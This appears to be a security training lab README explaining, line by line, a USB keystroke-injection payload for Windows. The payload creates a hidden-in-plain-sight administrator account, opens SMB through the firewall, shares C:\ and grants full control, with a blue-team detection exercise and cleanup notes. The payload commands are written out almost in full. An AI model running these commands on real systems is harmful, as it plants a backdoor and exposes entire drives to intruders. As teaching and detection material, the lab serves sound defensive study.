# Lab 01 — Rogue Admin Account + Open SMB Share

**Payload:** [payload.txt](payload.txt)
**Target:** Windows 10/11, local (non-domain) machine
**ATT&CK techniques:** T1136.001 (Create Account: Local Account),
T1098 (Account Manipulation), T1021.002 (SMB/Windows Admin Shares),
T1222.001 (File/Directory Permissions Mod: Windows).

## What it does, line by line

```
DELAY 1000        Wait 1s for the OS to recognize the HID device.
GUI r              Open the Run dialog.
DELAY 100
STRING powershell -Exec Bypass "saps cmd '/C ... ' -Verb RunAs"
                   Launches PowerShell, which uses saps (Start-Process
                   -Verb RunAs) to relaunch cmd.exe elevated, triggering
                   a UAC consent prompt. The elevated cmd runs a chained
                   one-liner:
                     net User ts ts /ADD                    create local user "ts", password "ts"
                     net LocalGroup Administrators ts /ADD   add "ts" to local Administrators
                     netsh advfirewall firewall set rule
                       group="File and Printer Sharing"
                       new enable=Yes                        opens SMB (445/139) through Windows Firewall
                     net share ts=c:\ /UNLIMITED             shares C:\ over SMB as \\host\ts
                     icacls c:* /grant ts:(OI)(CI)F           grants "ts" full control, recursively,
                                                               on every top-level item in C:\
ENTER              Submits the Run dialog.
DELAY 1000         Wait for the UAC prompt to render.
ALT y              Accepts the UAC prompt (Windows binds Alt+Y to "Yes"
                   on the English-language consent dialog only).
```

Net effect: an attacker with 5–10 seconds of physical USB access creates a
persistent, fully-privileged backdoor account and exposes the entire C:
drive over the network with no additional credentials needed on the LAN
side (SMB anonymous browsing is still gated by the share's ACL, but "ts"
now owns full control).

## Known weaknesses worth discussing with students

- `ALT y` only works if the OS display language binds Alt+Y to "Yes" on the
  UAC dialog. Non-English installs, or UAC set to "Always notify" with
  secure desktop dimming timing, can make this miss.
- No output suppression: a visible cmd/PowerShell window flashes briefly.
  `-WindowStyle Hidden` is conspicuously absent — ask students why an
  attacker might still choose to omit it (speed of dev, or intentionally
  leaving a "canary" for a demo).
- Hardcoded, weak credential (`ts`/`ts`) — trivially caught by any password
  policy or account-creation alerting.
- Everything here runs through normal, logged Windows utilities. Nothing
  is obfuscated. This is deliberate for the lab: it should be very
  detectable, so students can build confidence finding it before moving to
  harder labs.

## Blue-team exercise

Run [detect.ps1](detect.ps1) on the victim VM after the payload executes,
or have students work through the queries manually first. It checks for:

- New local users and Administrators group membership changes
- SMB shares that aren't the Windows defaults
- The File and Printer Sharing firewall rule group's enabled state
- Security event log entries: 4720 (user created), 4732 (added to
  security-enabled local group), 4732/4728 variants, 5142 (network share
  added)
- PowerShell operational log (event 4104, if script block logging is on)
  and Sysmon Event ID 1 for the actual `powershell.exe` command line

## Cleanup

Prefer reverting the VM snapshot. If you need an in-place reset for a
quick re-run, see [cleanup.ps1](cleanup.ps1) — but note it does **not**
attempt to strip the `icacls` grant from every file under C:\; that is
exactly the kind of operation you don't want to run against anything but
a disposable VM.
